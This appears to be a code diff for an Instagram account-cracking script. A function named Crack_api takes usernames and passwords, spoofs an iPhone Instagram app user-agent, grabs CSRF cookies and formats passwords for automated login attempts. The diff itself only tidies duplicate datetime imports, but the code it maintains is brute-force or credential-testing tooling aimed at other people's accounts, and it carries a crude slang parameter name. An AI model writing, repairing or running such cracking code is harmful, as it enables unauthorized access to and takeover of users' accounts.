@@ -15,7 +15,6 @@ import datetime
 from concurrent.futures import ThreadPoolExecutor
 from rich.panel import Panel as panel
 from rich import print as prints
-from datetime import datetime 
 # Global variables
 Uid, Uuid = [], []
 bkas = []
@@ -747,7 +746,6 @@ def Crack_api(username, kontol):
             headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104'}, timeout=10).cookies.get_dict()
             cooki = ("; ").join([f"{key}={value}" for key, value in cok.items()])
             csrf = list(ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/', timeout=10).cookies.items())[0][1]
-            import datetime
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
             headers = {
